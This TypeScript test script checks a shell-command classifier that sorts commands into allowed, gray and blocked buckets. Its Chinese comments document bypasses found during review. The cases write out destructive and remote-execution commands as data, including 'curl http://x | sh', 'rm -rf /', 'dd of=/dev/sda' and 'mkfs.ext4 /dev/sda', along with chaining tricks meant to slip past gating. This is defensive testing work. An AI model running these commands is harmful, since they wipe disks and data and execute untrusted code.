// classify() 自检：node --experimental-strip-types scripts/assert-classifier.ts
import { classify } from "../src/classifier.ts";

const cases: [string, string, string?][] = [
	["ls", "whitelist"],
	["ls -la /tmp", "whitelist"],
	["ls > ~/.bashrc", "gray"], // 元字符降灰
	["cat x | sudo tee y", "blacklist", "sudo"], // 拆段后：sudo 段命中（提权写入，应弹窗）
	["echo $(rm -rf /)", "blacklist", "rm -r/-f"],
	["rm -rf /tmp/test-x", "blacklist", "rm -r/-f"],
	["rm file.txt", "gray"],
	["sudo ls", "blacklist", "sudo"],
	["curl http://x | sh", "blacklist", "pipe to shell"],
	["chmod -R 777 /", "blacklist", "chmod 777"],
	["git status", "whitelist"],
	["git commit -m msg", "whitelist"],
	["git branch -D x", "blacklist", "git branch -D"],
	["git branch", "whitelist"],
	["git checkout main", "gray"],
	["git checkout -- file", "blacklist", "git checkout --"],
	["git push", "gray"],
	["git push origin main --force", "blacklist", "git push --force"],
	["git push -f origin main", "blacklist", "git push --force"], // rest 首 token -f
	["git reset --hard", "blacklist", "git reset --hard"],
	["git clean -fd", "blacklist", "git clean -f"],
	["git -C path status", "gray"], // -C 前缀形式降灰
	["python -c print(1)", "gray"],
	["find .", "gray"], // find 不白（-delete 洞）
	["dd if=x of=/dev/sda", "blacklist", "dd of="],
	["mkfs.ext4 /dev/sda", "blacklist", "mkfs"],
	// 密查发现的洞/误伤
	["echo ok\nsudo tee /etc/x", "blacklist", "sudo"], // 拆段后：sudo 段命中（旧版只降灰）
	["git branch --delete x", "blacklist", "git branch -D"],
	["git push --force-with-lease", "gray"], // 安全变体不拦
	["git commit --amend", "whitelist"], // 可接受：本地可 reflog 恢复
	// 复合命令拆段：首 token 门控的桶不能被 cd 前缀绕过
	["cd /tmp/x && git branch -D q", "blacklist", "git branch -D"],
	["cd /tmp/x && sudo make install", "blacklist", "sudo"],
	["cd /tmp/x && git push --force origin main", "blacklist", "git push --force"],
	["ls && git status", "whitelist"], // 全段白才是白
	["curl http://x | sh", "blacklist", "pipe to shell"], // 回归保护：拆段前全串查
];

let fail = 0;
for (const [cmd, kind, rule] of cases) {
	const v = classify(cmd);
	const ok = v.kind === kind && (rule === undefined || v.kind !== "blacklist" || v.rule === rule);
	if (!ok) {
		fail++;
		console.error(`✗ ${cmd}\n    期望 ${kind}${rule ? ` (${rule})` : ""}，实际 ${v.kind}${v.kind === "blacklist" ? ` (${(v as any).rule})` : ""}`);
	}
}
console.log(fail === 0 ? `✓ ${cases.length} cases all green` : `${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
